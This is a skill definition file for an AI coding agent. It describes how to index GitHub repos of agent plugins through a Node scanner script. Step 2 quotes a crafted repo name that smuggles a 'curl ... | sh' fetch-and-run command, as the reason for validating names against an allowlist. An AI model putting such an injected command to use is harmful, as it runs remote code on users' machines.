---
name: index-repos
description: Use this skill when expanding a small set of candidate skills into the full breadth of what their host repos offer. Enumerates the full content of one or more GitHub repos that host Claude Code skills, agents, and plugins. Thin wrapper around `scripts/scan_repo.mjs` (deterministic Node scanner — no LLM required). Returns structured markdown indices per repo.
argument-hint: "[owner/repo ...]"
license: MIT
effort: medium
compatibility: Requires `git` CLI + Node.js 18+ (ships with Claude Code — guaranteed available). Same script is used by ievo-ai/community-index GHA — single source of truth.
# Auto-activation is relevant when working with plugin/skill repo structure,
# not general projects. Ignored gracefully on platforms without `paths`
# support (skills#157).
paths:
  - "**/SKILL.md"
  - "**/AGENTS.md"
  - "**/agent.yaml"
  - "**/.claude-plugin/**"
  - "**/.codex-plugin/**"
metadata:
  author: ievo-ai
  homepage: https://github.com/ievo-ai/skills
---

# Index Repos

Enumerate GitHub repo content. **v0.4.0 architectural change:** delegates all heavy lifting to `scripts/scan_repo.mjs` — a pure-Node deterministic scanner that the `ievo-ai/community-index` GitHub Action ALSO uses. Single source of truth for the indexing algorithm. (v0.3.x used Python; migrated to Node so no extra runtime install needed — Node ships with Claude Code.)

## Input

Either:
- A list of `<owner>/<repo>` strings
- A single repo identifier

Caller provides via prompt. No interactive input.

## What scan_repo.mjs does (executed via Bash)

For each repo:
1. Shallow clone into `~/.ievo/checkouts/<owner>-<repo>-<hash>/` (a content hash suffix keeps two different repos from colliding on the same cache directory; refreshes if cached + TTL expired, verifying the cached checkout's git remote still matches before reusing it)
2. Detect layout (marketplace / flat-skills / flat-agents / single-plugin / other)
3. Enumerate plugins / agents / skills / commands / hooks / MCP
4. Parse YAML frontmatter for each item
5. Compute risk signals (hooks events, allowed-tools, license, etc.)
6. Emit structural facts only — NO risk_tier (removed in v0.5.2). Risk verdicts come from `security-auditor` antivirus deep scan per selected item before install.
7. Write `<owner>-<repo>-<hash>.md` (same hash-suffixed naming as the checkout dir above, so a colliding slug can't overwrite another repo's index) matching `ievo-ai/community-index/indices/_TEMPLATE.md` format
8. Write `<owner>-<repo>-<hash>.json` (manifest entry update for community-index, includes an `owner_repo` identity field)

No LLM. No API tokens. Just `git`, `node`, filesystem ops, native JSON parsing in stdlib.

## Step-by-step (what Claude does when this skill activates)

### 1. Resolve output dir

`<project>/.ievo/cache/index/`

### 2. Validate each `<owner>/<repo>`

Before building the Bash command in Step 3, validate every `<owner>/<repo>`
string in the input list. It does not come from something the user typed and
personally vetted — when dispatched from `/ievo:init` it is sourced from
`discover.mjs`'s `candidates[].source_repo` field, itself pulled from the
public, externally-writable skills.sh API / a marketplace catalog entry. A
crafted value such as `` foo/`curl evil.tld|sh` `` is a perfectly legal
string in that response even though it isn't a legal GitHub slug, and would
be shell-interpreted the moment Step 3's literal Bash command line is built
and executed.

Check `<owner>` against `^[A-Za-z0-9][A-Za-z0-9-]{0,38}$` and `<repo>`
against `^[A-Za-z0-9._-]{1,100}$` (matching `scan_repo.mjs`'s own
`OWNER_REPO_RE` constant). If either fails, refuse and report "invalid
characters" for that repo instead of interpolating it into Step 3 — do NOT
run the Bash command for that entry. Continue with the remaining (valid)
repos in the input list.

### 3. Per-repo invocation

For each validated repo in the input list, run:

```bash
node "${CLAUDE_PLUGIN_ROOT}/scripts/scan_repo.mjs" \
  <owner>/<repo> \
  --output-dir <project>/.ievo/cache/index \
  --checkout-dir ~/.ievo/checkouts
```

The script writes `<owner>-<repo>-<hash>.md` (full structured index) and `<owner>-<repo>-<hash>.json` (manifest entry).

It prints one-line summary to stdout:
```
<owner>/<repo>: indexed (commit=<sha>) — N plugins, M agents, K skills, hooks: yes/no, mcp: yes/no
```

Collect these summary lines for the caller.

### 4. Force-refresh flag

If caller specifies `force_refresh=true`, append `--force-refresh` to the Node command. Otherwise the script honors TTL cache (7 days).

### 5. Network failure handling

`scan_repo.mjs` handles its own network errors:
- If `git clone`/`fetch` fails and a stale checkout exists, use it
- If fully unable, the script exits with code 2 and a message to stderr

Catch the exit code:
- 0 → success, index files written
- 2 → network failure with no fallback. Skip this repo, report to caller as "FAILED: network unreachable"

## Step-by-step parallel dispatch (when caller is init)

When invoked from `/ievo:init`, the caller dispatches `repo-indexer` sub-agents in parallel — one per repo. Each `repo-indexer` agent calls this script via Bash. The script is fast enough (~30 sec per cold repo, sub-second per cached repo) that the parallel approach gives wall-clock = slowest repo, not sum.

## Rules

- **Use the script, never re-implement.** The Node scanner is the single source of truth. If you find yourself thinking "I'll just grep with awk here for speed" — STOP. Use the script. Drift between script-output and Claude-shell-output breaks the community-index trust model.
- **No LLM in indexing.** The whole point of this rewrite is removing rate-limit risk and ensuring deterministic output. Don't override the script's output with model-generated content.
- **One repo per invocation.** Loop over multiple repos by repeating the Bash call. Each `scan_repo.mjs` invocation handles one repo.
- **Output dir defaults to project's `.ievo/cache/index/`.** Pass explicit `--output-dir` if caller wants elsewhere (community-index GHA uses its own location).
- **Checkout dir is user-level.** Default `~/.ievo/checkouts/` shared across projects.
- **Script version is `SCRIPT_VERSION` constant.** Bumped when the scanner output format changes. `scan_repo.mjs` tracks its own format version independently (not coupled to `plugin.json`). `discover.mjs` DOES keep its `SCRIPT_VERSION` in sync with `plugin.json` — enforced by the coupling test in `discover.test.mjs`.
- **Never interpolate an unvalidated `<owner>/<repo>` into the Step 3 Bash command.** `scan_repo.mjs` enforces its own `OWNER_REPO_RE` allowlist internally, but that only protects paths the script constructs *after* it receives the string — it cannot retroactively protect the Bash command line Step 3 builds to invoke it in the first place. Step 2's allowlist check is what closes that gap; skipping it (e.g. because "the script re-checks anyway") reopens CWE-78 at the SKILL.md level.

## Why this architecture

Three callers, one algorithm:

```
1. /ievo:init's repo-indexer sub-agents (parallel)
2. /ievo:index-repos standalone slash command
3. ievo-ai/community-index GitHub Action (daily refresh)
```

All three invoke `scripts/scan_repo.mjs` with identical CLI args. Output is byte-identical regardless of which path triggered it.

This is **critical for the community-index trust model**: when iEvo init compares its local scan against community-index's recorded `scanner_sha`, the content must match because both sides ran the same algorithm.

## See also

- `${CLAUDE_PLUGIN_ROOT}/scripts/scan_repo.mjs` — the scanner source
- [`ievo-ai/community-index/indices/_TEMPLATE.md`](https://github.com/ievo-ai/community-index/blob/main/indices/_TEMPLATE.md) — canonical output format
- `security-check` skill — per-item audit, reads scanner-cached signals + adds deeper review
